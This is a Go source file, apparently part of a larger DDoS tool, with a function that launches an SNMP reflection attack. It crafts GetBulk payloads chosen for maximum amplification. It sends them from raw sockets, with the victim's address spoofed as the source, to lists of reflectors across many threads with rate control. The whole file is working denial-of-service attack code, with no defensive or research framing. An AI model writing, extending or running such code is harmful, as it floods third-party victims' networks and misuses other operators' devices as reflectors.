package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
)

func startSnmpReflection(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, reflectors []ReflectorData, threads int, duration time.Duration, pps int) {
	fmt.Printf("[!] Starting SNMP Reflection on %s:%d for %v with %d threads (PPS: %d)\n", targetIP, targetPort, duration, threads, pps)

	var wg sync.WaitGroup

	// SNMP Payloads - GetBulk on ifTable (1.3.6.1.2.1.2.2) for max amplification
	payloads := [][]byte{
		{
			0x30, 0x2e, 0x02, 0x01, 0x01, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,
			0xa5, 0x21, 0x02, 0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x28, // Max-repetitions: 40
			0x30, 0x13, 0x30, 0x11, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x02, 0x02, 0x01, 0x00,
			0x05, 0x00,
		},
	}

	var parsedReflectors []net.IP
	for _, r := range reflectors {
		cleanIP := r.Addr
		if h, _, err := net.SplitHostPort(r.Addr); err == nil {
			cleanIP = h
		}
		if ip := net.ParseIP(cleanIP).To4(); ip != nil {
			parsedReflectors = append(parsedReflectors, ip)
		}
	}

	if len(parsedReflectors) == 0 {
		fmt.Printf("[ERR] No SNMP reflectors found\n")
		return
	}

	victimIP := net.ParseIP(targetIP).To4()
	if victimIP == nil {
		fmt.Printf("[ERR] Invalid target IP: %s\n", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in SNMP: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			sockFd, err := openRawSocket(IPPROTO_UDP)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			udpBuf := make([]byte, 1500)

			for {
				// High-performance batching
				batchSize := 64
				if pps > 0 {
					if pps < 1000 {
						batchSize = 1
					} else if pps < 10000 {
						batchSize = 8
					}
					sleep := time.Second / time.Duration((pps/threads)/batchSize+1)
					time.Sleep(sleep)
				}

				select {
				case <-ctx.Done():
					return
				default:
					for b := 0; b < batchSize; b++ {
						reflIP := parsedReflectors[localRand.Intn(len(parsedReflectors))]
						
						payload := payloads[localRand.Intn(len(payloads))]
						// ID randomization in SNMP PDU
						binary.BigEndian.PutUint16(payload[15:], uint16(localRand.Intn(65535)))

						packet := buildSpoofedUDPLocalOptimized(victimIP, uint16(targetPort), reflIP, 161, payload, localRand, udpBuf)

						if sockFd != InvalidSocket {
							sendtoRaw(sockFd, packet, reflIP, 161)
							AddStats(1, int64(len(packet)))
						}
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[OK] SNMP Reflection finished\n")
}
